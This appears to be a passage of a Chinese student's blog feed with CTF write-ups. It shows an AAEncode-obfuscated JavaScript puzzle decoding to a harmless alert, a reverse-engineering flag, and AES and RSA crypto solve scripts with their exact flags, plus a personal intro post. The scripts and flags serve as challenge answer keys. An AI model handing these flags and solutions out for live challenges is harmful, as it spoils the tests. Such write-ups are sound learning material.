,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&#x27;_&#x27;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [c^_^o];(ﾟДﾟ) [&#x27;c&#x27;] = ((ﾟДﾟ)+&#x27;_&#x27;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#x27;o&#x27;] = ((ﾟДﾟ)+&#x27;_&#x27;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&#x27;c&#x27;]+(ﾟДﾟ) [&#x27;o&#x27;]+(ﾟωﾟﾉ +&#x27;_&#x27;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#x27;_&#x27;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#x27;c&#x27;]+((ﾟДﾟ)+&#x27;_&#x27;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#x27;o&#x27;]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ];(ﾟДﾟ) [&#x27;_&#x27;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#x27;_&#x27;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#x27;_&#x27;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&#x27;\\&#x27;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&#x27;_&#x27;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&#x27;\&quot;&#x27;;(ﾟДﾟ) [&#x27;_&#x27;] ( (ﾟДﾟ) [&#x27;_&#x27;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#x27;_&#x27;);</span><br></pre></td></tr></table></figure><p>是颜文字吧，搜颜文字在线解密<br /><a href="https://www.toolkk.com/tools/aaencode-encode-decode">https://www.toolkk.com/tools/aaencode-encode-decode</a><br />原来这算是AAEncode，涨见识了，得到<code>alert(&quot;flag&#123;Good&#125;&quot;);</code><br />结合前面，组合一下flag，<code>flag&#123;SoGood&#125;</code></p><h1 id="reverse一个flag劈三瓣儿"><a class="markdownIt-Anchor" href="#reverse一个flag劈三瓣儿"></a> 【REVERSE】一个flag劈三瓣儿</h1><p>IDA打开，发现flag函数，cv工程师上线<br /><code>flag&#123;HaiZI233N145wuD!le112@666&#125;</code></p><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><p>题目很多，可以说是Web手的福利局了(12道Web，全场最多)，下午五点才开始打，一直到晚上九点，主要输出是密码(这玩意算杂项吧这次的)和杂项，时间不多，就快速摸了几道简单的Web，有些Web卡壳了然后就放一边，后面再补，因为其他的题我感觉就快出了(手动狗头)，然后赛后补web，上面很多题都是赛后补的</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>VenomCTF2024wp</title>
      <link href="/2024/03/16/VenomCTF2024wp/"/>
      <url>/2024/03/16/VenomCTF2024wp/</url>
      
        <content type="html"><![CDATA[<p>嘶，纳新赛，是真的要拿出实力才行的<br />真好，不出意外，Web成功爆零了QWQ<br />签到完，就打了一道crypto，rank 174</p><h1 id="misc-checkin"><a class="markdownIt-Anchor" href="#misc-checkin"></a> Misc-checkin</h1><p>老样子，第一步先耍一哈游戏，然后看js代码，game.js没发现什么东西<br />然后在控制台或index.js发现<code>Quick pass cheat: I heard that Venom is ChaMd5’s, here is a mysterious string for you. 88d18c420654d158d22b65626bc7a878</code><br />找个靠谱的网站进行MD5解密。。。<br /><a href="https://www.somd5.com/">https://www.somd5.com/</a><br />好家伙，写wp的时候，这玩意又解不出来。。。我记得用的是这个网站的</p><h1 id="crypto-狂飙"><a class="markdownIt-Anchor" href="#crypto-狂飙"></a> Crypto-狂飙</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">key = os.urandom(<span class="number">24</span>)</span><br><span class="line">key = bytes_to_long(key)</span><br><span class="line">n = m % key</span><br></pre></td></tr></table></figure><p>已知n和m，解出key，这道题目就出了<br />嘶，一开始真的想，随机生成key来看看能不能直接get，发现没什么卵用，数量实在是太多了<br />同时，我们可以得到key是m-n的因子，然后直接对<code>m-n</code>进行了分解，得到<br /><code>k = [342291058100503482469327892079792475478873,5036645362649, 265898280367, 3939851, 439, 37, 3]</code><br />然后通过key的位数以及n,m,key的关系，慢慢试，确定了key</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">m = <span class="number">88007513702424243702066490849596817304827839547007641526433597788800212065249</span></span><br><span class="line">n = <span class="number">103560843006078708944833658339172896192389513625588</span></span><br><span class="line">k = [<span class="number">342291058100503482469327892079792475478873</span>,</span><br><span class="line">     <span class="number">5036645362649</span>, <span class="number">265898280367</span>, <span class="number">3939851</span>, <span class="number">439</span>, <span class="number">37</span>, <span class="number">3</span>]</span><br><span class="line">key = k[<span class="number">0</span>]*k[<span class="number">2</span>]*k[<span class="number">4</span>]*k[<span class="number">5</span>]</span><br><span class="line">key = (long_to_bytes(key))</span><br><span class="line">c = <span class="string">b&#x27;\xfc\x87\xcb\x8e\x9d\x1a\x17\x86\xd9~\x16)\xbfU\x98D\xfe\x8f\xde\x9c\xb0\xd1\x9e\xe7\xa7\xefiY\x95C\x14\x13C@j1\x9d\x08\xd9\xe7W&gt;F2\x96cm\xeb&#x27;</span></span><br><span class="line">iv = <span class="string">b&#x27;UN\x1d\xe2r&lt;\x1db\x00\xdb\x9a\x84\x1e\x82\xf0\x86&#x27;</span></span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"><span class="built_in">print</span>(aes.decrypt(c))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;cf735a4d-f9d9-5110-8a73-5017fc39b1b0&#125;\x00\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF_Round#19_Basic_Crypto专场</title>
      <link href="/2024/03/16/NSSCTF-Round-19-Basic-Crypto%E4%B8%93%E5%9C%BA/"/>
      <url>/2024/03/16/NSSCTF-Round-19-Basic-Crypto%E4%B8%93%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<p>本次比赛是密码专场，今天三场比赛要打QWQ<br />就打了第一道QWQ</p><h1 id="bestkasscn的超级简单密码"><a class="markdownIt-Anchor" href="#bestkasscn的超级简单密码"></a> bestkasscn的超级简单密码</h1><p>题目：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = p * <span class="number">5</span> + i</span><br><span class="line">    <span class="keyword">if</span> isPrime(r):</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    q = p * <span class="number">10</span> + i</span><br><span class="line">    <span class="keyword">if</span> isPrime(q):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">n = p * q * r</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag.encode()), e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c=&#x27;</span> + <span class="built_in">str</span>(c))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p3=&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">pow</span>(p, <span class="number">3</span>, n)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q3=&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">pow</span>(q, <span class="number">3</span>, n)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;r3=&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">pow</span>(r, <span class="number">3</span>, n)))</span><br></pre></td></tr></table></figure><p>本题的突破点是p<br />不难发现p3是p的倍数，分解发现，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mn>3</mn><mo>=</mo><msup><mi>p</mi><mn>3</mn></msup></mrow><annotation encoding="application/x-tex">p3=p^3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span><br />直接上脚本(送分)</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">96241803526087516516438618680574139229212699224895199026126947479609515703069904259770933066463243844738712136916991719874179296797623802919752542053959297743706931240798992583332970879091497936378700193716012227086531507335444090574605921869576355704757589370608232721639204280020820678250787751406162350723</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = p * <span class="number">5</span> + i</span><br><span class="line">    <span class="keyword">if</span> isPrime(r):</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    q = p * <span class="number">10</span> + i</span><br><span class="line">    <span class="keyword">if</span> isPrime(q):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">n = p*q*r</span><br><span class="line">c = <span class="number">11212699652154912414419576042130573737460880175860430868241856564678915039929479534373946033032215673944727767507831028500814261134142245577246925294110977629353584372842303558820509861245550773062016272543030477733653059813274587939179134498599049035104941393508776333632172797303569396612594631646093552388772109708942113683783815011735472088985078464550997064595366458370527490791625688389950370254858619018250060982532954113416688720602160768503752410505420577683484807166966007396618297253478916176712265476128018816694458551219452105277131141962052020824990732525958682439071443399050470856132519918853636638476540689226313542250551212688215822543717035669764276377536087788514506366740244284790716170847347643593400673746020474777085815046098314460862593936684624708574116108322520985637474375038848494466480630236867228454838428542365166285156741433845949358227546683144341695680712263215773807461091898003011630162481</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">d = inverse(<span class="number">0x10001</span>, phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br><span class="line"><span class="comment"># b&#x27;NSSCTF&#123;cc10786a-cc59-a07d-5c9f-df1c55b18cd4&#125;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>The First Blog</title>
      <link href="/2024/02/13/The-First-Blog/"/>
      <url>/2024/02/13/The-First-Blog/</url>
      
        <content type="html"><![CDATA[<p><img src="https://picx.zhimg.com/80/v2-ff4e83e828bcc982469921a8e4fc72a7_1440w.jpeg" alt="" /></p><h1 id="hello"><a class="markdownIt-Anchor" href="#hello"></a> Hello！！！</h1><p>Welcome To My First Blog!</p><p><strong>I’m HvAng</strong></p><p>From广州“某不知名”大学的一名计算机专业学生，22年高考进入了这所第二志愿的大学</p><p>从未（不能太绝对哈，但也只是一丢丢，是个纯小白）接触过电脑的我，踏上了计算机这条不归路（bushi）</p><p>大一摆烂仔（不提也罢），于大一的暑假前一两个月开始接触网络安全（本身专业网络工程，acm连cf都打不明白，没那个天赋和本事，还是CTF收留我）（又是一条不归路），暑假留校学习正式启动我的CTF生涯，学了点鸡毛蒜皮（还是太菜啦），几乎以个人之姿拿下校赛二等奖（还是好水啊）</p><p>目前，学习方向是Web（当时好入门，确实，但也比较难精进），Crypto（大二有相关课程，而且个人觉得挺有意思的，也能摸出不少题），偶尔的Misc手，我Web还是好菜，得多下功夫，不然跟不上我佬Qanux（同级Pwn爹好吧）的步伐了QWQ</p><p>博客去年11月就搭好了，期末开始摆烂，时隔三个月（过年抽空）写下这第一篇blog</p><p>同专业找不到人（?），然后喜欢一个人打比赛（bushi，没找人，懒，暂时没去打开这个圈子），希望今后认识些大佬，然后争取线下单杀（）</p><p>正在猥琐发育（大佬原话）的<strong>Web手HvAng</strong>，争取寒假回校后进入校队，认真努力搞好我的Web，拿点奖，干点CTF之外的事情，为将来进军网安领域打点基础（感jio有点天真）</p><p>不管了，大学四年总得搞好一些事情吧，一件也好（挺认同大佬这句话的）</p><p><strong>未完待续……</strong></p><span id="more"></span>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
